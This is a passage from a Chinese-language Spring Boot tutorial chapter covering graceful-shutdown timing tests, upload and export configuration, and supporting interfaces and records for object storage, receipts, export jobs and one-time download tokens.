  → ✅ 沒有任何請求被拒絕
```

> **關鍵：Kubernetes 的「移除 endpoint」與「送 SIGTERM」是並行的，不是有序的。**
> `preStop` 的 sleep 就是在補這個空窗。

**最終的不等式**：

```
max-sync-rows (20000 ≈ 4s)
      <  timeout-per-shutdown-phase (45s)
      <  terminationGracePeriodSeconds (75s) − preStop sleep (10s) = 65s
```

⚠️ 任何一個不等式不成立，就會有請求在關機時被砍。
**而那不會出現在任何測試裡** —— 它只在正式環境的部署當下發生。

**所以把它寫成一個測試**（07 章 7.13 的層級：純單元、跑得極快）：

```java
/**
 * ★ 把「三個數字的不等式」變成一個會紅燈的規則。
 *
 * <p>⚠️ 它讀的是**三個不同來源**的設定：
 *    application.yml、k8s 的 deployment.yaml、以及 api.export 的屬性。
 *    這種「跨檔案的一致性」正是最容易在改動時斷掉的東西
 *    （05 章 5.6.3 的 UploadPropertiesConsistencyTest 是同一個模式）。
 */
@Test
void 關機的三個逾時數字互相相容() {
    Duration shutdownPhase   = serverProps.getShutdownPhaseTimeout();   // 45s
    Duration preStopSleep    = k8s.preStopSleep();                      // 10s
    Duration terminationGrace= k8s.terminationGracePeriod();            // 75s
    Duration slowestSync     = exportProps.estimatedDurationFor(
                                       exportProps.maxSyncRows());      // ≈4s

    assertThat(slowestSync)
            .as("最慢的同步請求（%s 筆 ≈ %s）超過 graceful 的等待上限 %s ——"
              + " 那代表最大的同步匯出在部署時一定會被砍。"
              + " 修法：調低 api.export.max-sync-rows，或調高 timeout-per-shutdown-phase。",
                exportProps.maxSyncRows(), slowestSync, shutdownPhase)
            .isLessThan(shutdownPhase);

    assertThat(preStopSleep.plus(shutdownPhase))
            .as("preStop sleep（%s）+ graceful 等待（%s）超過 K8s 的"
              + " terminationGracePeriodSeconds（%s）——"
              + " kubelet 會在 Spring 還在收尾時送 SIGKILL。",
                preStopSleep, shutdownPhase, terminationGrace)
            .isLessThan(terminationGrace);
}
```

**一個關機行為的整合測試**（07 章 7.11 的層級）：

```java
/**
 * ★ 驗證 ContextClosedEvent 真的會結束 SSE 連線。
 *
 * <p>⚠️ 它驗證的是「監聽器的行為」，不是「真的關機」——
 *    後者只能用 docker + 真的 SIGTERM 驗證，在 CI 裡太貴。
 *    所以這裡接受這個近似，並把限制寫在註解裡
 *    （07 章 7.12：測試的界線要寫清楚，不要假裝涵蓋了更多）。
 *
 * <p>★ 而「@PreDestroy 改成 ContextClosedEvent」這件事，
 *    正是這個測試能抓到而 @PreDestroy 版本抓不到的 ——
 *    因為測試裡發布的就是 ContextClosedEvent。
 */
@Test
void 關機時SSE連線會被主動結束() {
    var received = new CopyOnWriteArrayList<ServerSentEvent<String>>();
    var sub = subscribeCollecting("/orders/ord_1/events", null, received);

    await().until(() -> registry.size() == 1);

    applicationContext.publishEvent(new ContextClosedEvent(applicationContext));

    await().atMost(Duration.ofSeconds(3))
            .as("關機時沒有送出 stream.reconnect。後果（5.11.10）："
              + "客戶端看到的是 connection reset 而不是計畫性關閉，"
              + "而且 5,000 條連線會同時重連（沒有 reconnectTime 的抖動）。")
            .until(() -> received.stream()
                    .anyMatch(e -> "stream.reconnect".equals(e.event())));

    // ★ 而且連線要真的被結束（否則 Tomcat 還是會等滿 45 秒）
    await().atMost(Duration.ofSeconds(3)).until(() -> registry.size() == 0);

    sub.dispose();
}
```

---

## 5.12 shop-service 落地清單

### 5.12.1 這一章新增的檔案

```
src/main/java/example/shop/
├── common/
│   ├── upload/
│   │   ├── SafeFilename.java                  檔名清理（5.4.2）
│   │   ├── StorageKeys.java                   儲存 key 產生（5.4.3）
│   │   ├── ContentTypeDetector.java           magic number（5.5.2）
│   │   ├── ImageReencoder.java                二次編碼（5.5.3）
│   │   ├── SafeZip.java                       ZIP 防護（5.5.4）
│   │   ├── UserContentHeaders.java            使用者內容的防護標頭（5.5.5）
│   │   ├── MalwareScanner.java                掃毒介面（5.5.6）
│   │   ├── ClamAvScanner.java                 ClamAV 實作
│   │   ├── MalwareScannerConfig.java          no-op 後備
│   │   ├── UploadValidator.java               完整驗證（5.5.7）
│   │   ├── ValidatedUpload.java
│   │   ├── UploadProperties.java              設定（5.6.3）
│   │   ├── MultipartTempSweeper.java          暫存檔清理（5.3.4）
│   │   ├── UploadRejectedException.java
│   │   ├── ImageRejectedException.java
│   │   ├── MalwareDetectedException.java
│   │   └── web/
│   │       └── CallRecordingUploadController.java   預簽名上傳（5.7.2）
│   ├── web/
│   │   ├── ShutdownSignal.java                ★ 關機通知（5.11.10）
│   │   ├── ContentDispositions.java           檔名編碼（5.8.1）
│   │   ├── CsvWriter.java                     CSV + 公式注入防護（5.9.2）
│   │   ├── StreamingRequests.java             串流偵測（5.9.6）
│   │   ├── QueryMasker.java                   query string 遮蔽（5.10.6）
│   │   └── IdempotencyFingerprint.java        冪等指紋（5.6.4，改寫 04 章）
│   └── config/
│       ├── AsyncMvcConfig.java                串流執行緒池（5.9.3）
│       └── SchedulingConfig.java              排程執行緒池（5.11.4）
├── product/web/
│   └── ProductImageController.java            圖片上傳（5.6.2）
└── order/
    ├── web/
    │   ├── OrderReceiptController.java        收據下載（5.8.2）
    │   ├── OrderCsvExportController.java      同步 CSV（5.9.2）
    │   ├── OrderExportController.java         非同步匯出（5.10.4）
    │   ├── OrderEventStreamController.java    SSE（5.11.3）
    │   └── SyncExportTooLargeException.java
    └── service/
        ├── DownloadTokenService.java          一次性 token（5.10.6）
        ├── ExportProgressReporter.java        進度回報（5.10.7）
        ├── ExportRetentionSweeper.java        檔案清理（5.10.8）
        ├── SseProperties.java                 ★ SSE 的設定（5.12.4）
        ├── SseEmitterRegistry.java            SSE 登錄簿（5.11.6）
        │                                      ★ shutdown() 的觸發點改為
        │                                        ContextClosedEvent（5.11.10）
        ├── SseHeartbeat.java                  心跳（5.11.4）
        ├── SseRedisBridge.java                跨實例（5.11.6）
        ├── SseErrors.java                     SSE 錯誤（5.11.9）
        ├── OrderEventReplayService.java       Last-Event-ID（5.11.5）
        └── TooManySseConnectionsException.java
```

### 5.12.2 完整的 `application.yml`（這一章相關的部分）

```yaml
spring:
  servlet:
    multipart:
      enabled: true
      max-file-size: 10MB              # ★ 必須與 api.upload.max-file-size 一致
      max-request-size: 20MB           # ★ 必須與 api.upload.max-request-size 一致
      file-size-threshold: 128KB       # 5.3.3 的取捨
      location: /var/tmp/shop-uploads  # ★ 明確指定，才能掛獨立 volume
      resolve-lazily: false

  # ★ 非同步 MVC（串流與 SSE 都需要）
  mvc:
    async:
      # ⚠️ 這個值被 AsyncMvcConfig.configureAsyncSupport 覆寫（120s）——
      #    留在這裡是為了讓沒有經過 configurer 的路徑也有一個上限。
      request-timeout: 120s

  # ★★ 5.11.10：graceful shutdown 的等待上限。
  #    ⚠️⚠️ 這個 key 是 `spring.lifecycle.*`，【不是】`server.lifecycle.*`。
  #      放錯位置的話 Boot 會【完全忽略】它（relaxed binding 找不到對應的
  #      @ConfigurationProperties 就是靜默忽略，不會啟動失敗）——
  #      於是實際生效的是預設的 30 秒，而 5.11.10 那整套
  #      「三個數字的不等式」與它的測試全部失去意義。
  #    ★ 5.11.10 的 ShutdownTimingConsistencyTest 就是為了守住這件事
  #      （它讀的是 SpringApplicationShutdownHandlers 實際看到的值，
  #       而不是這個 YAML 的字面內容）。
  #
  #    必須 > 最慢的同步請求（max-sync-rows=20000 → 約 4s），
  #    且 < Kubernetes 的 terminationGracePeriodSeconds − preStop sleep
  lifecycle:
    timeout-per-shutdown-phase: 45s

server:
  # ★★ 5.11.10：長連線在 pod 重啟時的行為。預設是 immediate（硬砍）。
  shutdown: graceful
  compression:
    enabled: true
    # ★ text/event-stream 刻意不在清單裡（5.11.7）
    mime-types: application/json,application/problem+json,text/csv,application/xml
    min-response-size: 2048
  tomcat:
    max-connections: 20000             # ★ 為 SSE 調高（5.11.8）
    threads:
      max: 200                         # SSE 不佔工作執行緒，不用調
    max-swallow-size: 2MB              # 5.3.7：保持預設，靠前面幾層擋
    connection-timeout: 20s

api:
  upload:
    max-file-size: 10MB
    max-request-size: 20MB
    max-images-per-product: 10
    public-base-url: https://cdn.shop.example
    malware-scan:
      enabled: true
      host: clamav
      port: 3310
      timeout: 10s
      max-scan-bytes: 20MB
    download:
      presigned-url-ttl: 5m
      download-token-ttl: 15m
      proxy-through-application: false

  export:
    max-sync-rows: 20000               # 5.9.2
    success-retention: 7d              # 5.10.8
    failure-retention: 30d
    stuck-threshold: 2h

  # ★ 綁到 SseProperties（5.12.4）—— 這五個值都【不是】程式碼裡的常數，
  #   因為運維要能調、測試要能改（5.11.6 有完整理由）
  sse:
    connection-timeout: 30m            # 5.11.3
    heartbeat-interval: 20s            # 5.11.4
    max-total-connections: 5000        # 5.11.6
    max-connections-per-actor: 10
    max-replay-events: 100             # 5.11.5

---
spring:
  config:
    activate:
      on-profile: local
api:
  upload:
    public-base-url: http://localhost:9000/shop-dev     # MinIO
    malware-scan:
      enabled: false                   # 本機不跑 ClamAV
    download:
      proxy-through-application: true  # 本機沒有預簽名 URL 的能力
```

**設定一致性的測試**（5.6.3 提到的 `UploadPropertiesConsistencyTest`）：

```java
package example.shop.common.upload;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.util.unit.DataSize;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「兩處設定必須一致」的測試。
 *
 * <p>★ 為什麼需要它：{@code spring.servlet.multipart.max-file-size} 決定
 * <b>Tomcat 什麼時候拒絕</b>，而 {@code api.upload.max-file-size} 決定
 * <b>我們的錯誤訊息說什麼</b>。兩者不一致的症狀是
 * 「錯誤訊息說上限 10 MB，但 8 MB 的檔案就被拒絕了」——
 * 使用者會以為系統壞了。
 *
 * <p>⚠️ 這種「設定必須一致」的測試很少人寫，但它抓到的 bug
 * 通常是「有人改了一處忘了改另一處」，而那類 bug 在 code review 裡很難看出來。
 */
@SpringBootTest
class UploadPropertiesConsistencyTest {

    @org.springframework.beans.factory.annotation.Autowired
    UploadProperties uploadProperties;

    @Value("${spring.servlet.multipart.max-file-size}")
    DataSize springMaxFileSize;

    @Value("${spring.servlet.multipart.max-request-size}")
    DataSize springMaxRequestSize;

    @Test
    @DisplayName("api.upload 與 spring.servlet.multipart 的上限一致")
    void 上限一致() {
        assertThat(uploadProperties.maxFileSize())
                .as("api.upload.max-file-size 必須等於 spring.servlet.multipart.max-file-size")
                .isEqualTo(springMaxFileSize);
        assertThat(uploadProperties.maxRequestSize())
                .isEqualTo(springMaxRequestSize);
    }

    @Test
    @DisplayName("單檔上限不可大於整個請求的上限")
    void 大小關係合理() {
        assertThat(uploadProperties.maxFileSize().toBytes())
                .isLessThanOrEqualTo(uploadProperties.maxRequestSize().toBytes());
    }

    @Test
    @DisplayName("掃毒的大小上限不小於單檔上限（否則大檔永遠掃不到）")
    void 掃毒上限合理() {
        if (!uploadProperties.malwareScan().enabled()) return;
        assertThat(uploadProperties.malwareScan().maxScanBytes().toBytes())
                .as("maxScanBytes 小於 maxFileSize 會讓大檔永遠是 PENDING_SCAN")
                .isGreaterThanOrEqualTo(uploadProperties.maxFileSize().toBytes());
    }

    @Test
    @DisplayName("下載 token 的 TTL 大於預簽名 URL 的 TTL")
    void TTL關係合理() {
        // ★ 理由：使用者拿到 downloadUrl（含 token）之後，
        //   我們才用它去換預簽名 URL。token 先過期的話那個換取會失敗。
        assertThat(uploadProperties.download().downloadTokenTtl())
                .isGreaterThan(uploadProperties.download().presignedUrlTtl());
    }
}
```

### 5.12.3 四種「大東西」的最終決策表 ★

| 需求 | 大小 | 做法 | 章節 |
|---|---|---|---|
| **上傳** 頭像 | < 128 KB | multipart，留在記憶體，二次編碼 | 5.6 |
| **上傳** 商品圖 | 1～10 MB | multipart，落暫存檔，二次編碼 | 5.6 |
| **上傳** 收據 PDF | < 10 MB | multipart，掃毒，不改內容 | 5.5.6 |
| **上傳** 通話錄音 | 100 MB～2 GB | **預簽名 URL** | 5.7 |
| **上傳** 訂單匯入 ZIP | < 20 MB | multipart + `SafeZip` | 5.5.4 |
| **下載** 商品圖 | < 1 MB | CDN 公開 URL（不經過 API） | 5.8.4 |
| **下載** 發票 PDF | < 200 KB | 應用程式代理（`ByteArrayResource`） | 5.8.2 |
| **下載** 收據 | 幾 MB | 302 → 預簽名（TTL 5 分鐘） | 5.8.4 |
| **下載** 通話錄音 | 幾百 MB | 302 → 預簽名（TTL 2 分鐘）+ 稽核 | 5.8.4 |
| **匯出** < 20,000 筆 | 幾 MB | `StreamingResponseBody`（同步） | 5.9 |
| **匯出** > 20,000 筆 | 幾十 MB | **202 + 輪詢 + 一次性 token** | 5.10 |
| **推播** 訂單狀態 | 每則 < 1 KB | **SSE** + Redis pub/sub | 5.11 |
| **推播** 匯出進度 | — | 輪詢（有 `Retry-After` 指引） | 5.10.4 |

### 5.12.4 支援型別：前面用到但還沒定義的東西

**這一章的程式碼引用了幾個型別。** 和 04 章 4.13.6 一樣，這一節把它們補完。

#### `ObjectStorage`：物件儲存的抽象

```java
package example.shop.common.storage;

import java.io.InputStream;
import java.net.URI;
import java.time.Duration;
import java.util.Optional;

/**
 * 物件儲存。
 *
 * <p>★ 抽成介面的四個理由：
 * <ol>
 *   <li>本機開發用檔案系統或 MinIO，正式環境用 S3 —— 程式碼不變。</li>
 *   <li>測試用記憶體實作，不需要 Testcontainers。</li>
 *   <li>它是 Web 層與基礎設施的邊界（第 00 章 0.4）——
 *       Controller 不該知道 S3 的 SDK 長什麼樣。</li>
 *   <li>換供應商（S3 → GCS → 自建 Ceph）不用改 Web 層。</li>
 * </ol>
 *
 * <p>⚠️ 這個介面刻意<b>不</b>提供「列出所有物件」的方法：
 * 那是一個很容易被誤用的操作（一個 prefix 下有 400 萬個物件時
 * 它會拖垮應用程式）。需要盤點的話用雲端供應商的 inventory 報表。
 *
 * <p>完整實作在 06-repository；這裡只定義契約。
 */
public interface ObjectStorage {

    /**
     * 存入一個物件。
     *
     * @param key         儲存 key（由 {@code StorageKeys} 產生）
     * @param content     內容（⚠️ 呼叫者負責關閉）
     * @param sizeBytes   內容大小（S3 需要它才能不緩衝整個內容）
     * @param contentType 由 magic number 判定的型別
     */
    StoredObject store(String key, InputStream content, long sizeBytes, String contentType);

    /** 開啟一個物件的輸入流（⚠️ 呼叫者負責關閉）。 */
    InputStream openStream(String key);

    /**
     * 讀取一個範圍的位元組。
     *
     * <p>★ 5.7.3 用它來驗證預簽名上傳的內容型別（只讀前 64 bytes）。
     */
    byte[] readRange(String key, long offset, int length);

    /** 只取 metadata，不下載內容。 */
    Optional<ObjectMetadata> headObject(String key);

    /** 伺服器端複製（不經過應用程式的頻寬）。 */
    void copy(String sourceKey, String targetKey);

    /** 刪除（⚠️ 不存在時不該拋例外 —— 刪除要冪等）。 */
    void delete(String key);

    /** 簽發一個限時的下載 URL。 */
    URI presignedGetUrl(String key, Duration ttl, String downloadFilename);

    /** 簽發一個限時的上傳 URL（5.7.2）。 */
    PresignedUpload presignedPutUrl(String key, Duration ttl,
                                    String contentType, long maxSizeBytes,
                                    String sha256Base64);

    record StoredObject(String key, long sizeBytes, String etag) {}

    record ObjectMetadata(String key, long sizeBytes, String contentType,
                          String etag, java.time.Instant lastModified) {}

    record PresignedUpload(URI url, java.util.Map<String, String> requiredHeaders,
                           java.time.Instant expiresAt) {}
}
```

```java
package example.shop.common.storage;

import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.stereotype.Component;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.time.Duration;
import java.time.Instant;
import java.util.Arrays;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 記憶體版的物件儲存 —— 給測試與本機開發用。
 *
 * <p>★ 為什麼值得寫這 80 行：它讓「上傳 → 下載 → 匯出」的整合測試
 * 完全不需要 Docker。5.13 的每一個測試都靠它。
 *
 * <p>⚠️ {@code presignedGetUrl} 回一個假的 URL ——
 * 所以測試環境的 {@code proxy-through-application} 必須是 {@code true}。
 */
@Component
@ConditionalOnProperty(name = "api.storage.type", havingValue = "in-memory")
public class InMemoryObjectStorage implements ObjectStorage {

    private final Map<String, Entry> objects = new ConcurrentHashMap<>();

    @Override
    public StoredObject store(String key, InputStream content, long sizeBytes,
                              String contentType) {
        try {
            byte[] bytes = content.readAllBytes();
            String etag = Integer.toHexString(Arrays.hashCode(bytes));
            objects.put(key, new Entry(bytes, contentType, etag, Instant.now()));
            return new StoredObject(key, bytes.length, etag);
        } catch (IOException e) {
            throw new java.io.UncheckedIOException(e);
        }
    }

    @Override
    public InputStream openStream(String key) {
        Entry entry = require(key);
        return new ByteArrayInputStream(entry.content());
    }

    @Override
    public byte[] readRange(String key, long offset, int length) {
        byte[] content = require(key).content();
        int from = (int) Math.min(offset, content.length);
        int to = (int) Math.min(offset + length, content.length);
        return Arrays.copyOfRange(content, from, to);
    }

    @Override
    public Optional<ObjectMetadata> headObject(String key) {
        return Optional.ofNullable(objects.get(key))
                .map(e -> new ObjectMetadata(key, e.content().length, e.contentType(),
                                             e.etag(), e.lastModified()));
    }

    @Override
    public void copy(String sourceKey, String targetKey) {
        objects.put(targetKey, require(sourceKey));
    }

    /** ★ 刪除不存在的 key 不拋例外 —— 刪除要冪等。 */
    @Override
    public void delete(String key) {
        objects.remove(key);
    }

    @Override
    public URI presignedGetUrl(String key, Duration ttl, String downloadFilename) {
        return URI.create("memory://" + key);
    }

    @Override
    public PresignedUpload presignedPutUrl(String key, Duration ttl, String contentType,
                                           long maxSizeBytes, String sha256Base64) {
        return new PresignedUpload(URI.create("memory://upload/" + key),
                Map.of("Content-Type", contentType), Instant.now().plus(ttl));
    }

    /** 測試輔助。 */
    public void clear()             { objects.clear(); }
    public int size()               { return objects.size(); }
    public boolean contains(String key) { return objects.containsKey(key); }

    private Entry require(String key) {
        Entry entry = objects.get(key);
        if (entry == null) {
            throw new ObjectNotFoundException(key);
        }
        return entry;
    }

    private record Entry(byte[] content, String contentType,
                         String etag, Instant lastModified) {}
}
```

```java
package example.shop.common.storage;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 物件不存在。
 *
 * <p>⚠️ 為什麼是 500（{@code INTERNAL_ERROR}）而不是 404：
 * 如果資料庫裡有一筆紀錄指向這個 key，而物件不存在，
 * 那是<b>資料不一致</b>（我們的 bug），不是「使用者要的東西不存在」。
 *
 * <p>回 404 會讓這個 bug 被當成正常情況而永遠不被發現。
 * 回 500 會產生告警（03 章 3.12.4）—— 這正是我們要的。
 */
public class ObjectNotFoundException extends BusinessException {
    public ObjectNotFoundException(String key) {
        super(ErrorCode.INTERNAL_ERROR,
              "Stored object is missing: " + key,
              null,
              // ⚠️ key 不放進 extensions —— 5xx 的回應不該有內部資訊（03 章 3.11.1）
              Map.of(),
              new Object[0],
              List.of());
    }
}
```

#### `ImageMetadata`：圖片上傳的 metadata part

```java
package example.shop.product.web.dto;

import jakarta.validation.constraints.Max;
import jakarta.validation.constraints.Min;
import jakarta.validation.constraints.Pattern;
import jakarta.validation.constraints.Size;

import java.util.List;

/** 5.3.6 寫法 A 的 JSON part。 */
public record ImageMetadata(

    @Size(max = 200, message = "替代文字最多 200 字")
    String alt,

    @Min(0) @Max(99)
    Integer position,

    @Size(max = 20, message = "標籤最多 20 個")
    List<@Pattern(regexp = "^[a-z0-9-]{1,30}$",
                  message = "標籤只能用小寫英數字與連字號") String> tags

) {
    /** ★ 防禦性：讓 tags 永遠不是 null，呼叫端不用判斷。 */
    public ImageMetadata {
        tags = (tags == null) ? List.of() : List.copyOf(tags);
    }
}
```

#### 領域型別：`Receipt`、`UploadIntent`、`CallRecording`

5.8、5.7 的 Service 程式碼用到這三個領域型別。

```java
package example.shop.order.domain;

import java.time.Instant;

/**
 * 訂單收據（客戶上傳的付款憑證）。
 *
 * <p>★ 兩個欄位值得說明：
 * <ul>
 *   <li>{@code storageKey} 是我們產生的（5.4.3），{@code displayName} 是清理過的
 *       客戶端檔名（5.4.2）—— <b>兩者刻意分開</b>。</li>
 *   <li>{@code contentHash} 用於 ETag（05 章 5.8.2）與「偵測重複上傳」。</li>
 * </ul>
 */
public record Receipt(
    String receiptId,
    String orderId,
    String storageKey,
    String displayName,
    String contentType,
    long sizeBytes,
    String contentHash,
    ReceiptScanStatus scanStatus,
    String uploadedBy,
    Instant uploadedAt
) {}
```

```java
package example.shop.order.domain;

/**
 * 收據的掃毒狀態（5.5.6）。
 *
 * <p>★ 為什麼需要一個獨立的狀態而不是一個布林：
 * {@code MalwareScanner} 有三種結果（CLEAN / INFECTED / UNAVAILABLE），
 * 而 {@code UNAVAILABLE} 必須是一個<b>可見的、可事後處理的</b>狀態 ——
 * 布林會迫使我們把它硬歸到 true 或 false 其中一邊。
 */
public enum ReceiptScanStatus {

    /** 掃描通過，可以下載。 */
    CLEAN,

    /** 尚未掃描（掃描器當時不可用）—— <b>下載端點回 202</b>（5.5.6）。 */
    PENDING,

    /** 偵測到惡意內容 —— 下載端點回 404（不洩漏它存在過）。 */
    INFECTED;

    public boolean isDownloadable() {
        return this == CLEAN;
    }
}
```

```java
package example.shop.order.web;

import java.net.URI;

/**
 * 一份「已確認可下載」的收據。
 *
 * <p>★★ 為什麼要一個獨立的型別而不是直接用 {@link Receipt}：
 * 它的存在<b>本身就是「授權已通過」的證明</b>（5.8.5 的四層檢查全部做完了）。
 *
 * <p>這是一個很有用的模式：<b>把「檢查過了」變成型別上的事實</b>，
 * 而不是一個「希望呼叫者記得先檢查」的約定。
 * Controller 拿到它就可以直接寫回應，不需要再問「這個人有權限嗎」。
 */
public record DownloadableReceipt(
    String receiptId,
    String orderId,
    String storageKey,
    String displayName,
    String contentType,
    long sizeBytes,
    String contentHash
) {}
```

```java
package example.shop.common.upload;

import java.time.Instant;

/** 預簽名上傳的意圖（5.7.2 的步驟 ①）。 */
public record UploadIntent(
    String uploadId,
    String orderId,
    /** ★ tmp/ 底下的暫存位置 —— complete 時才搬到正式 key（5.7.3）。 */
    String storageKey,
    String declaredFilename,
    String declaredContentType,
    long declaredSizeBytes,
    String declaredSha256,
    UploadIntentStatus status,
    String createdBy,
    Instant createdAt,
    Instant expiresAt
) {}
```

```java
package example.shop.common.upload;

/**
 * 上傳意圖的狀態。
 *
 * <p>⚠️ {@code ABANDONED} 與 {@code EXPIRED} 分開的理由和 05 章 5.10.3 的
 * {@code CANCELLED} / {@code EXPIRED} 一樣：<b>使用者主動放棄</b>與
 * <b>系統清理</b>需要不同的錯誤訊息。
 */
public enum UploadIntentStatus {
    PENDING, COMPLETED, EXPIRED, ABANDONED;

    public boolean isTerminal() {
        return this != PENDING;
    }
}
```

```java
package example.shop.order.domain;

import java.time.Instant;

/** 客服的通話錄音（5.7 的預簽名上傳產物）。 */
public record CallRecording(
    String recordingId,
    String orderId,
    String storageKey,
    String displayName,
    long sizeBytes,
    String contentType,
    /** 由背景任務算出（上傳完成時還不知道）—— 所以可以是 null。 */
    Integer durationSeconds,
    String uploadedBy,
    Instant createdAt
) {}
```

```java
package example.shop.common.upload.service;

import example.shop.order.domain.Actor;

import java.net.URI;
import java.time.Duration;
import java.util.Map;

/**
 * 預簽名上傳的 Service 契約（5.7.2、5.7.3）。
 *
 * <p>實作在 05-service；這裡定義 Web 層依賴的介面。
 */
public interface PresignedUploadService {

    IntentResult createIntent(CreateUploadIntentCommand command);

    /** @throws example.shop.common.upload.UploadRejectedException 六道驗證任一失敗（5.7.3） */
    CallRecordingResult complete(String uploadId, String etag, Actor actor);

    IntentResult getIntent(String uploadId, Actor actor);

    /**
     * @param requiredHeaders 客戶端 PUT 時<b>必須</b>帶的標頭 ——
     *                        它們進了簽章，少一個 S3 就回 403（5.7.2）
     */
    record IntentResult(String uploadId, URI uploadUrl,
                        Map<String, String> requiredHeaders,
                        example.shop.common.upload.UploadIntentStatus status,
                        java.time.Instant expiresAt) {}

    record CallRecordingResult(String recordingId, String orderId, String displayName,
                               long sizeBytes, Integer durationSeconds,
                               java.time.Instant createdAt) {}
}
```

```java
package example.shop.order.service;

import example.shop.order.domain.Actor;
import example.shop.order.web.DownloadableReceipt;

import java.io.InputStream;
import java.net.URI;
import java.time.Duration;

/**
 * 收據的下載契約（5.8.2、5.8.5）。
 *
 * <p>★ 方法命名刻意用 {@code getDownloadable} 而不是 {@code getReceipt}：
 * 它明確表達「這個方法做了授權檢查」（見 {@link DownloadableReceipt} 的 javadoc）。
 */
public interface OrderReceiptService {

    /**
     * @throws example.shop.common.error.ResourceNotFoundException 不存在或無權存取
     * @throws example.shop.order.web.ReceiptScanPendingException  掃毒未完成（202）
     */
    DownloadableReceipt getDownloadable(String orderId, String receiptId, Actor actor);

    URI presignedUrl(DownloadableReceipt receipt, Duration ttl);

    /** ⚠️ 呼叫者負責關閉（05 章 5.8.2 的 {@code InputStreamResource}）。 */
    InputStream openStream(DownloadableReceipt receipt);

    /** 小檔案用這個 —— 讓「讀取失敗」發生在寫回應之前（5.8.2）。 */
    byte[] readAllBytes(DownloadableReceipt receipt);
}
```

#### 匯出工作的型別：`OrderExportJob` 與兩個 repository

```java
package example.shop.order.domain;

import example.shop.order.web.dto.OrderExportResponse;

import java.time.Instant;

/**
 * 匯出工作（5.10）。
 *
 * <p>⚠️ {@code lastHeartbeatAt} 是<b>必要</b>的欄位，不是可有可無的 ——
 * 用 {@code startedAt} 判斷「卡住」會把正常的長時間匯出誤判為失敗（5.10.8）。
 */
public record OrderExportJob(
    String exportId,
    ExportStatus status,
    String format,
    String requestedBy,

    OrderExportResponse.Progress progress,

    /** 成功時才有值。 */
    String storageKey,
    String filename,
    Long sizeBytes,
    Long rowCount,
    String contentType,
    String sha256,

    /** 失敗時才有值。 */
    String errorCode,
    String errorUserMessage,
    String errorTraceId,

    Instant createdAt,
    Instant startedAt,
    /** ★ 5.10.8：進度更新順便就是 heartbeat。 */
    Instant lastHeartbeatAt,
    Instant completedAt,
    Instant expiresAt
) {}
```

```java
package example.shop.order.service;

import example.shop.order.domain.ExportStatus;
import example.shop.order.domain.OrderExportJob;

import java.time.Instant;
import java.util.List;
import java.util.Optional;

/**
 * 匯出工作的儲存（實作在 06-repository）。
 *
 * <p>★ 這個介面刻意只暴露「5.10 用得到的操作」。
 * 特別注意<b>沒有</b>一個通用的 {@code save(job)} ——
 * 那會讓「狀態轉移」變成呼叫者的責任，
 * 而 5.10.3 的狀態機需要它被集中控制。
 */
public interface OrderExportRepository {

    Optional<OrderExportJob> findById(String exportId);

    Optional<ExportStatus> findStatus(String exportId);

    /** ★ 節流過的進度更新（5.10.7）—— 同時更新 lastHeartbeatAt。 */
    void updateProgress(String exportId, long processedRows, long totalRows, Instant at);

    void markFailed(String exportId, String errorCode, String userMessage);

    void markExpired(String exportId);

    /** 撤銷這個匯出所有還沒過期的下載 token（5.10.8）。 */
    void revokeDownloadTokens(String exportId);

    List<OrderExportJob> findSucceededBefore(Instant cutoff, int limit);

    /** ★ 用 lastHeartbeatAt 而不是 startedAt（5.10.8 的警告）。 */
    List<OrderExportJob> findRunningWithHeartbeatBefore(Instant cutoff, int limit);
}
```

```java
package example.shop.order.service;

import java.time.Instant;

/**
 * 一次性下載 token 的紀錄（5.10.6）。
 *
 * <p>⚠️ {@code tokenHash} 而不是 {@code token} —— 資料庫只存 hash。
 * 這個 record 的<b>任何欄位都不含</b>可以直接用來下載的憑證。
 */
public record DownloadToken(
    String tokenHash,
    String exportId,
    String actorId,
    Instant expiresAt,
    int useCount,
    int maxUses
) {}
```

```java
package example.shop.order.service;

import java.time.Instant;
import java.util.Optional;

/**
 * 下載 token 的儲存。
 *
 * <p>★★ {@link #tryConsume} 是這個介面的關鍵：它必須是<b>一個原子操作</b>。
 *
 * <pre>
 * UPDATE download_token
 *    SET use_count = use_count + 1, last_used_at = ?
 *  WHERE token_hash = ? AND export_id = ?
 *    AND expires_at &gt; ? AND use_count &lt; max_uses
 * </pre>
 *
 * <p>⚠️ 分成「先 SELECT 檢查、再 UPDATE 計數」會讓兩個併發請求都通過
 * → 一個 3 次的 token 被用 4 次（04 章 4.9.1 的競態 1 是同一個問題）。
 *
 * <p><b>這就是為什麼這個方法叫 {@code tryConsume} 而不是
 * {@code find} + {@code increment}</b> —— 介面的命名讓「必須原子」
 * 變成一件明顯的事。
 */
public interface DownloadTokenRepository {

    void save(DownloadToken token);

    /** @return 消耗成功時回傳<b>消耗前</b>的狀態；失敗（不存在／過期／用完）回 empty */
    Optional<DownloadToken> tryConsume(String tokenHash, String exportId, Instant now);

    /** ★ 只用於「區分失敗原因並寫進日誌」（5.10.6）—— 不可用於授權決策。 */
    Optional<DownloadToken> findByHash(String tokenHash);
}
```

```java
package example.shop.order.service;

import example.shop.order.domain.OrderEvent;

import java.util.List;

/**
 * 訂單事件的儲存（5.11.5 的斷線續傳）。
 *
 * <p>★ 這份資料<b>本來就需要存在</b>（{@code GET /orders/{id}/status-changes}
 * 端點要用它，03-rest-api 1.14.3）——
 * SSE 只是「同一份資料的另一種傳遞方式」。
 */
public interface OrderEventRepository {

    /**
     * @param afterSequence 客戶端手上的最後一個序號（0 = 全部近期事件）
     * @param limit         上限 + 1（呼叫者用它判斷有沒有被截斷，5.11.5）
     */
    List<OrderEvent> findByOrderIdAfterSequence(String orderId, long afterSequence, int limit);

    /** @return 該訂單的下一個序號（★ 每個訂單各自遞增，5.11.5） */
    long nextSequence(String orderId);
}
```

```java
package example.shop.order.domain;

import java.time.Instant;

/**
 * 一筆訂單事件。
 *
 * <p>⚠️ {@code payload} 的型別是 {@code Object} 而不是 {@code String}：
 * 它會被序列化成 SSE 的 {@code data:} 行，
